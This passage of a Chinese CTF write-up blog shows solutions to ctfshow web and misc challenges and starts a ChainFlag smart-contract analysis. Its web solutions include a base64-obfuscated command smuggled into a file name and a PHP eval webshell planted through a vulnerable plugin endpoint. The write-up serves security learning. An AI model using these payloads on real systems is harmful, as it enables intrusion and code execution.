punctuation">;</span><span class="token variable">$o</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">-&gt;</span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"小甜甜"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="19-LSB探姬"><a href="#19-LSB探姬" class="headerlink" title="19. LSB探姬"></a>19. LSB探姬</h3><p><img src="/../../../pic/Pasted%20image%2020221119162608.png"></p><p><img src="/../../../pic/Pasted%20image%2020221119162618.png"></p><p>查看源代码发现存在命令拼接以及 flag 的位置</p><p>在文件名处插入命令，</p><pre class="line-numbers language-none"><code class="language-none">123;echo 'Y2F0IC9hcHAvZmxhZy5weSAgPiBzdGF0aWMvanMvZmxhZy5qcw=='|base64 -d|sh=&gt; cat /app/flag.py  &gt; static/js/flag.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221119162755.png"></p><p>然后访问 static/js/flag.js 获取 flag</p><h3 id="20-Is-Not-Obfuscate"><a href="#20-Is-Not-Obfuscate" class="headerlink" title="20. Is_Not_Obfuscate"></a>20. Is_Not_Obfuscate</h3><p>查看页面源代码发现一些奇怪的东西</p><p><img src="/../../../pic/Pasted%20image%2020221119204905.png"></p><p>访问  robots.txt，获得</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">User-agent: *Allow: /lib.php$Disallow: /lib.php?flag=0Disallow: /plugins<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>访问 <code>/lib.php?flag=1</code> 获得一串密文</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">eJwNkze2o0AABA9EAAI0gmADGGEGEE74DI<span class="token operator">/</span>w3p1<span class="token operator">+</span><span class="token operator">/</span>wX69euqzpVDJ2a<span class="token operator">/</span>GkWO4z4QQpnTUq9P5fFd3Uu<span class="token operator">+</span>YvM2ht<span class="token operator">+</span>ZXSvYiLXq0o8zaUZ<span class="token operator">/</span>KSKHeeauPge1HS1rQOaCRvmX5oevKRQajpkc1lMgFhD9uJCH4CSDtZnx8zALzJLhLR2K<span class="token operator">+</span>WAbhIjf62yY9EFNAfOklJvHScguku8Y5yhtuZSeNGY1vr<span class="token operator">+</span>NHn6Jn3MYCnm<span class="token operator">/</span>z9GbI9TH0XZfPPoqqZRrKo48Gdz<span class="token operator">+</span>odPf29M09uAXmYMftuX5lbIg586dsj8IPGvx3sRUZROiNLXSiM4s1dil6jpvB8cst8uk6ftkZcIF9tF4N0l7mIhew6On6LVPiWk7YaFYcBSI<span class="token operator">+</span>CLjlUx0heeixgqiWcRtNyHMfs64sx7oVEPY4ZVZg<span class="token operator">/</span>EmgnR<span class="token operator">+</span>x6othXTZ2ZGQsEYvRa<span class="token operator">/</span>U1LaK<span class="token operator">/</span><span class="token number">4</span>D7Op3ZKrKFnzAs01qSCbbf<span class="token operator">+</span>P097nH5uUElYiGbytryRvxAe4t1V5PA2dkKlweEANhJ<span class="token operator">+</span>DU5vzz0<span class="token operator">+</span>doHA<span class="token operator">+</span><span class="token number">3</span>opUlU80ol9Ghxas7B3bayW892QCULlB3LuNEEaS2mp1LoXm8dTJAZgM3BGfCHNYbkODF0DqNXrFCMswdFjb9cCnMokKdNZnLUubhW0yA4h807ywaHFZvPxCuG05XdxV6nLiZapgdgHjFpXFbnrwz9LIzLCGMw<span class="token operator">+</span>F7BHMJPheaGD3faUo71nCiV6QWQu0VW<span class="token operator">/</span>O2DvG<span class="token operator">+</span>eubaq5t1a5Y3tYJmti6soht26kuF7jUUg<span class="token operator">+</span>vZz3guJPIhqEvujvCubvp9WFznqRBETu6RM8yssRUdkXOcelo3bvnM3onXcf9<span class="token operator">+</span>kQvcSUbuwuEnWHYzn16<span class="token operator">/</span>ewTo<span class="token operator">+</span>gVIqv0<span class="token operator">+</span>DNJC0YUGs9kWnS2<span class="token operator">+</span><span class="token number">1</span>sAvpdp6qe46VGHNv5Ehm8XNg9SPQyrFYwqRuQZZ<span class="token operator">/</span>r2muD0WE4G5qRRQ8dnmkgxTVF7Zh61<span class="token operator">/</span>yvmis14AVf3UwjoHywgVs7MNevg<span class="token operator">/</span>tCL4JwsgHx6FLo0CANOoThXQcpMmu1ZcY<span class="token operator">+</span>MB7L5c4S<span class="token operator">+</span><span class="token number">5</span>arvpFKn<span class="token operator">/</span>GN4KvCEWYZ<span class="token operator">+</span>r7inzI<span class="token operator">+</span>ng3O1T0eaaqFmy63HfCz4xYWYn4PFjC7ukhBJfY7E<span class="token operator">+</span>fPm6bO7<span class="token operator">/</span>jSe<span class="token operator">+</span><span class="token number">2</span>SuGuZ5Crxj8yPiLLA1h61snzuxvqfM0ulqNmp<span class="token operator">/</span>SzwQLyo5N5HVZEVzMdqY7RiEqT6<span class="token operator">/</span>FOLji7N<span class="token operator">/</span><span class="token number">7E3</span>c<span class="token operator">+</span><span class="token number">8</span>ZLOGGQcDJMM5FARuDOfYyh09<span class="token operator">+</span><span class="token constant">M</span><span class="token operator">+</span>I1Hdc<span class="token operator">+</span>bCze4S0TuOa3j7orHPzP<span class="token operator">/</span>BLQQLKt6c4cLZ42QbgJwmpowDmVjo<span class="token operator">/</span>R6dyCuJbWwKGS8BVtzxfh2YhYu<span class="token operator">+</span>r1n7mrY7nPTxszI6w<span class="token operator">/</span>TWAErJEBVZwXlj33RDqfi<span class="token operator">+</span>u45uVP292vZOCDP0RHKuVL20QeMwhqsY47fQ7ZuLeKP<span class="token operator">/</span><span class="token number">9</span><span class="token operator">+</span>w8pT7oT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221119205035.png"></p><p>注意到这一段，当 action 为 test 时会对输入内容解码并执行</p><p>访问</p><pre class="line-numbers language-none"><code class="language-none">?input=eJwNkze2o0AABA9EAAI0gmADGGEGEE74DI%2Fw3p1%2B%2FwX69euqzpVDJ2a%2FGkWO4z4QQpnTUq9P5fFd3Uu%2BYvM2ht%2BZXSvYiLXq0o8zaUZ%2FKSKHeeauPge1HS1rQOaCRvmX5oevKRQajpkc1lMgFhD9uJCH4CSDtZnx8zALzJLhLR2K%2BWAbhIjf62yY9EFNAfOklJvHScguku8Y5yhtuZSeNGY1vr%2BNHn6Jn3MYCnm%2Fz9GbI9TH0XZfPPoqqZRrKo48Gdz%2BodPf29M09uAXmYMftuX5lbIg586dsj8IPGvx3sRUZROiNLXSiM4s1dil6jpvB8cst8uk6ftkZcIF9tF4N0l7mIhew6On6LVPiWk7YaFYcBSI%2BCLjlUx0heeixgqiWcRtNyHMfs64sx7oVEPY4ZVZg%2FEmgnR%2Bx6othXTZ2ZGQsEYvRa%2FU1LaK%2F4D7Op3ZKrKFnzAs01qSCbbf%2BP097nH5uUElYiGbytryRvxAe4t1V5PA2dkKlweEANhJ%2BDU5vzz0%2BdoHA%2B3opUlU80ol9Ghxas7B3bayW892QCULlB3LuNEEaS2mp1LoXm8dTJAZgM3BGfCHNYbkODF0DqNXrFCMswdFjb9cCnMokKdNZnLUubhW0yA4h807ywaHFZvPxCuG05XdxV6nLiZapgdgHjFpXFbnrwz9LIzLCGMw%2BF7BHMJPheaGD3faUo71nCiV6QWQu0VW%2FO2DvG%2Beubaq5t1a5Y3tYJmti6soht26kuF7jUUg%2BvZz3guJPIhqEvujvCubvp9WFznqRBETu6RM8yssRUdkXOcelo3bvnM3onXcf9%2BkQvcSUbuwuEnWHYzn16%2FewTo%2BgVIqv0%2BDNJC0YUGs9kWnS2%2B1sAvpdp6qe46VGHNv5Ehm8XNg9SPQyrFYwqRuQZZ%2Fr2muD0WE4G5qRRQ8dnmkgxTVF7Zh61%2Fyvmis14AVf3UwjoHywgVs7MNevg%2FtCL4JwsgHx6FLo0CANOoThXQcpMmu1ZcY%2BMB7L5c4S%2B5arvpFKn%2FGN4KvCEWYZ%2Br7inzI%2Bng3O1T0eaaqFmy63HfCz4xYWYn4PFjC7ukhBJfY7E%2BfPm6bO7%2FjSe%2B2SuGuZ5Crxj8yPiLLA1h61snzuxvqfM0ulqNmp%2FSzwQLyo5N5HVZEVzMdqY7RiEqT6%2FFOLji7N%2F7E3c%2B8ZLOGGQcDJMM5FARuDOfYyh09%2BM%2BI1Hdc%2BbCze4S0TuOa3j7orHPzP%2FBLQQLKt6c4cLZ42QbgJwmpowDmVjo%2FR6dyCuJbWwKGS8BVtzxfh2YhYu%2Br1n7mrY7nPTxszI6w%2FTWAErJEBVZwXlj33RDqfi%2Bu45uVP292vZOCDP0RHKuVL20QeMwhqsY47fQ7ZuLeKP%2F9%2Bw8pT7oT&amp;action=test&amp;output=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获得部分源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'lib.php'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./plugins/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./plugins/'</span><span class="token punctuation">,</span> <span class="token number">0777</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//Test it and delete it ！！！</span><span class="token comment">//测试执行加密后的插件代码</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Anything is good?Please test it.'</span><span class="token punctuation">;</span>    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'open_basedir'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'./plugins/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'pull'</span><span class="token punctuation">:</span>            <span class="token variable">$output</span> <span class="token operator">=</span> @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./plugins/'</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'input'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"pull success"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token string single-quoted-string">'push'</span><span class="token punctuation">:</span>            <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./plugins/'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'output'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'youyou'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'output'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"push success"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 push 功能中将我们自定义内容写入到文件中</p><p>在 pull 功能中将文件内容执行</p><p>payload</p><pre class="line-numbers language-none"><code class="language-none">?input=&amp;action=push&amp;output=&lt;?php eval($_POST[0]);phpinfo();?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>计算目标文件名</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php eval($_POST[0]);phpinfo();?&gt;'</span><span class="token operator">.</span><span class="token string single-quoted-string">'youyou'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 6fd7acb4681628a0192562ca33acbe2a</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?input=6fd7acb4681628a0192562ca33acbe2a&amp;action=pull&amp;output= <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-杂项签到"><a href="#1-杂项签到" class="headerlink" title="1. 杂项签到"></a>1. 杂项签到</h3><p>使用 010Editor 打开后搜索 ctfshow</p><p><img src="/../../../pic/Pasted%20image%2020221111214838.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ctfshow{a62b0b55682d81f7f652b26147c49040}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-损坏的压缩包"><a href="#2-损坏的压缩包" class="headerlink" title="2. 损坏的压缩包"></a>2. 损坏的压缩包</h3><p>使用 010Editor 打开后发现开头为 89 50 4E 47，说明为 PNG 文件，修改后缀为 png 后打开即可获得 flag</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">ctfshow{e19efe2eb86f10ccd7ca362110903c05}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-谜之栅栏"><a href="#3-谜之栅栏" class="headerlink" title="3. 谜之栅栏"></a>3. 谜之栅栏</h3><p><img src="/../../../pic/Pasted%20image%2020221122231141.png"></p><p>ctfshow{f0a6a0b721cfb949a7fb55ab5d8d210a}</p><h3 id="4-你会数数吗"><a href="#4-你会数数吗" class="headerlink" title="4. 你会数数吗"></a>4. 你会数数吗</h3><p>使用 010Editor，工具-&gt;直方图-&gt;按计数排序</p><p><img src="/../../../pic/Pasted%20image%2020221122231322.png"></p><p>ctfshow{a1b2d3e4g56i7j8k9l0}</p><h3 id="5-你会异或吗"><a href="#5-你会异或吗" class="headerlink" title="5. 你会异或吗"></a>5. 你会异或吗</h3><p><img src="/../../../pic/Pasted%20image%2020221122231458.png"></p><p><img src="/../../../pic/Pasted%20image%2020221122231510.png"></p><p><img src="/../../../pic/Pasted%20image%2020221122231520.png"></p><p>获得图片，打开后获得 flag</p><p>ctfshow{030dOf5073ab4681d30866d1fdf10ab1}</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh">CTFshow菜狗杯官方wp</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/127830557">CTFSHOW菜狗杯 web_yu22x的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/m0_61155226/article/details/127840059">CTFshow-菜狗杯WP_ctf show 你会异或吗_SlackMoon的博客-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ChainFlag - CounterStrike</title>
      <link href="/2023/01/21/catchtheflag/blockchain/chainflag/chainflag-counterstrike/"/>
      <url>/2023/01/21/catchtheflag/blockchain/chainflag/chainflag-counterstrike/</url>
      
        <content type="html"><![CDATA[<h1 id="ChainFlag-CounterStrike"><a href="#ChainFlag-CounterStrike" class="headerlink" title="ChainFlag - CounterStrike"></a>ChainFlag - CounterStrike</h1><p>复现地址：<a href="https://chainflag.org/challenges#CounterStrike-4">https://chainflag.org/challenges#CounterStrike-4</a></p><h2 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 题目描述"></a>0x00 题目描述</h2><ul><li>发现个大炸弹，受累把它电源关了。</li></ul><h2 id="0x01-题目源码"><a href="#0x01-题目源码" class="headerlink" title="0x01 题目源码"></a>0x01 题目源码</h2><p>contracts/EasyBomb.sol</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.10</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./Launcher.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">EasyBomb</span><span class="token punctuation">{</span>    <span class="token builtin">bool</span> <span class="token keyword">private</span> hasExplode <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">private</span> launcher_address<span class="token punctuation">;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">private</span> password<span class="token punctuation">;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> power_state <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token builtin">bytes4</span> <span class="token keyword">constant</span> launcher_start_function_hash <span class="token operator">=</span> <span class="token builtin">bytes4</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span><span class="token string">"setdeadline(uint256)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Launcher launcher<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">msgPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bytes32</span> result<span class="token punctuation">)</span>  <span class="token punctuation">{</span>        <span class="token builtin">bytes</span> <span class="token keyword">memory</span> msg_data <span class="token operator">=</span> msg<span class="token punctuation">.</span>data<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>msg_data<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">0x0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">assembly</span> <span class="token punctuation">{</span>            result <span class="token operator">:=</span> <span class="token function">mload</span><span class="token punctuation">(</span><span class="token function">add</span><span class="token punctuation">(</span>msg_data<span class="token punctuation">,</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">modifier</span> <span class="token function">isOwner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">msgPassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> x<span class="token punctuation">;</span>        <span class="token keyword">assembly</span> <span class="token punctuation">{</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span>caller<span class="token punctuation">)</span> <span class="token punctuation">}</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">modifier</span> <span class="token function">notExplodeYet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        launcher <span class="token operator">=</span> <span class="token function">Launcher</span><span class="token punctuation">(</span>launcher_address<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>number <span class="token operator">&lt;</span> launcher<span class="token punctuation">.</span><span class="token function">deadline</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hasExplode <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token keyword">_</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _launcher_address<span class="token punctuation">,</span> <span class="token builtin">bytes32</span> _fake_flag<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        launcher_address <span class="token operator">=</span> _launcher_address<span class="token punctuation">;</span>        password <span class="token operator">=</span> _fake_flag <span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">setCountDownTimer</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _deadline<span class="token punctuation">)</span> <span class="token keyword">public</span> isOwner notExplodeYet <span class="token punctuation">{</span>        launcher_address<span class="token punctuation">.</span><span class="token function">delegatecall</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"setdeadline(uint256)"</span><span class="token punctuation">,</span>_deadline<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>contracts/Setup.sol</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.10</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./EasyBomb.sol"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"./Launcher.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Setup</span> <span class="token punctuation">{</span>    EasyBomb <span class="token keyword">public</span> easyBomb<span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> _password<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        easyBomb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EasyBomb</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Launcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">isSolved</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> easyBomb<span class="token punctuation">.</span><span class="token function">power_state</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>contracts/Launcher.sol</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.5.10</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Launcher</span><span class="token punctuation">{</span>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> deadline<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">setdeadline</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _deadline<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        deadline <span class="token operator">=</span> _deadline<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">{</span>        deadline <span class="token operator">=</span> block<span class="token punctuation">.</span>number <span class="token operator">+</span> <span class="token number">100</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-解题过程"><a href="#0x02-解题过程" class="headerlink" title="0x02 解题过程"></a>0x02 解题过程</h2><p>看到获取 flag 的条件为 power_state() 值为 false，而没有直接修改该值的位置</p><p>setCountDownTimer 函数在满足 isOwner 和 notExplodeYet 的条件下会 delegatecall 调用执行 launcher_address 的setdeadline(uint256) 函数。</p><p>关于 delegatecall 的调用，相关的介绍文章有很多，这里只是简要介绍一下，使用 delegatecall 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。相当于将外部的 launcher_address 合约中的 setdeadline(uint256) 函数拷贝到 EasyBomb 合约中。利用这样的规则有可能将 EasyBomb 合约的 power_state 全局变量变为 false。</p><p>调用的外部合约 launcher_address 在部署 EasyBomb 合约时确定，题目所给的源码中合约 Launcher 的setdeadline(uint256) 函数没有具体内容，如果为空的话就没有啥后续的思路了</p><p>于是我这里按照流程创建题目环境，首先选择选项一：</p><p>先创建一个账户并向其转入测试币用于部署合约</p><p>我这里获取到的合约信息为</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] contract address: 0xB2731B06fa3D23f8463D3Dd2F3473eb1d89a3971[+] transaction hash: 0xf77fe9549300b0ae484db230379be0634c2e4e6d3cd2650b3b6b01a639be6f41<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>为了能够顺利调用函数setCountDownTimer，需要通过两个修饰器 isOwner 和 notExplodeYet，下面我们分析如果通过这两个函数。</p><p>修饰器 isOwner 一共有三个条件，一是要求 msgPassword() 的返回值等同于全局变量 password ，二是要求消息的直接发送者不等同于交易原始的发送者，三是要求消息的直接发送者的代码段大小为0。</p><p>首先看第一个要求，msgPassword()返回的是 msg.data 0x44 位置之后的值，msg.data 就是调用合约函数时的inputdata，一般前 4 个字节是表示的函数名，后面是函数的参数，要满足条件需要我们构造输入数据使得 0x44 位置后的值为password，而 password 的值就是创建 EasyBomb 合约时的参数  _fake_flag，即 0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d。</p><p>第二个要求 msg.sender != tx.origin，要求我们不能通过账户直接调用合约函数，可以通过构建一个合约调用函数。</p><p>第三个要求直接调用者的代码长度为 0，在满足第二个条件的基础上，这里要用到一个小技巧，合约创建过程中的代码长度就是 0，因此我们的攻击合约需要将攻击代码放在合约的构建函数 constructor 中。</p><p>下面是第二个修饰器notExplodeYet:</p><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">modifier</span> <span class="token function">notExplodeYet</span><span class="token 